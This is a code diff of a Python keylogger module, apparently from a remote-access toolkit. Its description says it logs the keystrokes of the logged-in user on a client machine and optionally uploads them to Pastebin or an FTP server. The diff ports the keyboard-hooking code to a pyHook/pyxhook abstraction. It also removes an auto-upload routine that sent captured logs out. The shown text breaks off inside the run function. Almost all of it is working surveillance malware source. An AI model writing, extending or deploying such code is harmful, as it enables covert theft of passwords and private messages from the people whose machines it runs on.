@@ -6,11 +6,23 @@
 import os
 import sys
 import time
-import Queue
-import urllib
 import StringIO
 import threading
-import collections
+
+try:
+    from io import StringIO        # Python 3
+except ImportError:
+    from StringIO import StringIO  # Python 2
+
+# packages
+if sys.platform == 'win32':
+    import pyHook as hook_manager
+    import pythoncom
+else:
+    import pyxhook as hook_manager
+
+# utilities
+import util
 
 # globals
 abort = False
@@ -19,83 +31,57 @@ packages = ['util','pyHook','pythoncom'] if os.name == 'nt' else ['util','pyxhoo
 platforms = ['win32','linux2','darwin']
 window = None
 max_size = 4000
-logs = StringIO.StringIO()
+logs = StringIO()
 threads = {}
 results = {}
 usage = 'keylogger <run/status/stop>'
 description = """
-Log the keystrokes of the currently logged-in user on the 
+Log the keystrokes of the currently logged-in user on the
 client host machine and optionally upload them to Pastebin
-or an FTP server 
+or an FTP server
 """
-
 
 # main
 def _event(event):
+    global window
     try:
-        if event.WindowName != globals()['window']:
-            globals()['window'] = event.WindowName
-            globals()['logs'].write("\n[{}]\n".format(window))
+        if event.WindowName != window:
+            window = event.WindowName
+            logs.write("\n[{}]\n".format(window))
         if event.Ascii > 32 and event.Ascii < 127:
-            globals()['logs'].write(chr(event.Ascii))
+            logs.write(chr(event.Ascii))
         elif event.Ascii == 32:
-            globals()['logs'].write(' ')
+            logs.write(' ')
         elif event.Ascii in (10,13):
-            globals()['logs'].write('\n')
+            logs.write('\n')
         elif event.Ascii == 8:
-            globals()['logs'].seek(-1, 1)
-            globals()['logs'].truncate()
+            logs.seek(-1, 1)
+            logs.truncate()
         else:
             pass
     except Exception as e:
         util.log('{} error: {}'.format(event.func_name, str(e)))
     return True
 
-@util.threaded
 def _run():
+    global abort
     while True:
-        hm = pyHook.HookManager() if os.name == 'nt' else pyxhook.HookManager()
+        hm = hook_manager.HookManager()
         hm.KeyDown = _event
         hm.HookKeyboard()
         pythoncom.PumpMessages() if os.name == 'nt' else time.sleep(0.1)
-        if globals()['abort']: break
-
-@util.threaded
-def auto(mode):
-    """ 
-    Auto-upload to Pastebin or FTP server
-    """
-    while True:
-        try:
-            if globals()['logs'].tell() > globals()['max_size']:
-                result  = util.pastebin(globals()['logs']) if mode == 'pastebin' else util.ftp(globals()['logs'], filetype='.txt')
-                results.put(result)
-                globals()['logs'].reset()
-            elif globals()['abort']:
-                break
-            else:
-                time.sleep(1)
-        except Exception as e:
-            util.log("{} error: {}".format(auto.func_name, str(e)))
+        if abort:
             break
 
-def dump():
-    """
-    Dump the log results
-
-    """
-    result = globals()['logs'].getvalue()
-    globals()['logs'].reset()
-    return result
-
 def run():
-    """ 
+    """
     Run the keylogger
 
     """
+    global threads
     try:
-        if 'keylogger' not in globals()['threads'] or not globals()['threads']['keylogger'].is_alive():
-            globals()['threads']['keylogger'] = _run()
-        return True
+        if 'keylogger' not in threads or not threads['keylogger'].is_alive():
+            threads['keylogger'] = threading.Thread(target=_run, name=time.time())
+        return threads['keylogger']
     except Exception as e:
         util.log(str(e))
